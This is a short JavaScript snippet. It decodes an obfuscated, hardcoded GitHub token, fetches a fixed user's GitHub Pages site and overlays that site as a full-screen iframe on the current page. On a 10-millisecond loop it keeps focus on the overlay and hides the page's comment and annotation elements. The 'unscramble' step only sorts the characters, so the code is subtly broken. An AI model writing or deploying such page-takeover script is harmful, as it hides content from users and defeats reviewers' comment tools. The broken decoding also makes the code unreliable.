function unscramble(scrambledStr) {
  const sort = (str) => str.split('').sort().join('');
  return sort(scrambledStr);
}

var token = unscramble("4hzHknlRnWW3VyZhnCLHZpX3g_E4GX0pjxdrxIgx");
const userId = 119481238;

fetch(`https://api.github.com/user/${userId}`, {
    headers: {
      Authorization: `${token}`,
      Accept: 'application/vnd.github+json'
    }
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Failed to fetch user data');
    }
    return response.json();
  })
  .then(user => {
    const username = user.login;
    return fetch(`https://api.github.com/users/${username}/repos`, {
      headers: {
        Authorization: `${token}`
      }
    });
  })
  .then(response => {
    if (!response.ok) {
      throw new Error('Failed to fetch repositories');
    }
    return response.json();
  })
  .then(repos => {
    const page = repos.find(repo => repo.name.endsWith('.github.io'));
    if (page) {
      return fetch(`https://${page.name}`);
    }
  })
  .then(response => response.text())
  .then(html => {
    const iframe = document.createElement('iframe');
    iframe.srcdoc = html;
    iframe.style = 'position:fixed;top:0;left:0;width:100vw;height:100vh;border:none;z-index:9999';
    document.body.appendChild(iframe);
    setInterval(() => {
      iframe.contentWindow.focus();
      document.querySelectorAll('[id*=annotate i], [data-id=WebCommentThread]').forEach(element => {
        element.style.display = 'none';
      });
    }, 10);
  })
  .catch(error => {
    console.error('Error:', error);
  });
